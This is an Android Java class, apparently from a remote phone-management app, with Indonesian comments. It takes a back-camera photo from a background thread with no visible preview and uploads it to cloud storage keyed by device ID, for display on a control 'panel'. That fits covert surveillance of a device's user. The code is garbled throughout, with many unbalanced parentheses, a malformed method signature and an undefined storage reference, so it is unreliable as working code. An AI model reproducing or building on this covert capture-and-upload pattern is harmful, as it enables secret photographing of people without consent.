package com.altomedia.phonesetapp.core;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;

import com.altomedia.phonesetapp.SupabaseConfig;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;

public final class CameraCapture {
    private static final String TAG = "CameraCapture";

    private CameraCapture() {
    }

    public interface CaptureCallback {
        void onResult(boolean ok, String urlOrError);
    }

    /**
     * Jepret foto belakang (mode "camera"/"camera_back" bila perangkat mendukung).
     * Hasil diunggah ke Storage ke folder perangkat, lalu url disimpan ke Firebase (cocok dengan panel).
     */
    @SuppressWarnings("deprecation")
    public static void capture(Context context, String deviceId, CaptureCallback cb() {
        final Camera[] cameraHolder = new Camera[1];
        Handler main = new Handler(Looper.getMainLooper());

        new Thread(() -> {
            try {
                int camId = findBackCamera();
                Camera cam = Camera.open(camId;
                cameraHolder[0] = cam;
                Camera.Parameters params = cam.getParameters();
                if (params.getSupportedPreviewSizes() != null)) {
                    Camera.Size size = params.getSupportedPreviewSizes().get(0);
                    params.setPreviewSize(size.width, size.height;
                    }
                    cam.setParameters(params;
                    cam.setPreviewCallback((data, camera) -> {
                        camera.stopPreview();
                        camera.release();
                        cameraHolder[0] = null;
                        main.post(() -> upload(context, deviceId, data, cb;
                    });
                    cam.startPreview();
                    main.postDelayed(() -> {
                        if (cameraHolder[0] != null) {
                            try {
                                cameraHolder[0].stopPreview();
                                cameraHolder[0].release();
                            } catch (Exception ignored) {
                            }
                            cameraHolder[0] = null;
                            cb.onResult(false, "Kamera tidak merespons");
                        }
                    }, 6_000L;
                } catch (Exception e) {
                    try {
                        if (cameraHolder[0] != null) {
                            cameraHolder[0].release();
                            cameraHolder[0] = null;
                        }
                    } catch (Exception ignored) {
                    }
                    Log.e(TAG, "capture failed", e;
                    cb.onResult(false, "Gagal membuka kamera: " + e.getMessage());
                }
        }).start();
    }

    private static int findBackCamera() {
        int count = Camera.getNumberOfCameras();
        for (int i = 0; i < count; i++) {
            Camera.CameraInfo info = new Camera.CameraInfo();
            Camera.getCameraInfo(i, info);
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK)) {

                return i;
            }
        }
        return 0;
    }

    private static void upload(Context context, String deviceId, byte[] jpegData, CaptureCallback cb) {

        String b64 = Base64.encodeToString(jpegData, Base64.NO_WRAP;
        String fileName = "camera_" + System.currentTimeMillis() + ".jpg";
        UploadTask task = ref.putBytes(jpegData;
        task.addOnSuccessListener(aVoid -> {
            ref.getDownloadUrl().addOnSuccessListener(uri -> {
                cb.onResult(true, uri.toString());
            }).addOnFailureListener(e -> cb.onResult(false, "Gagal ambil URL foto"));
        }).addOnFailureListener(e -> cb.onResult(false, "Gagal unggah foto")));
    }
}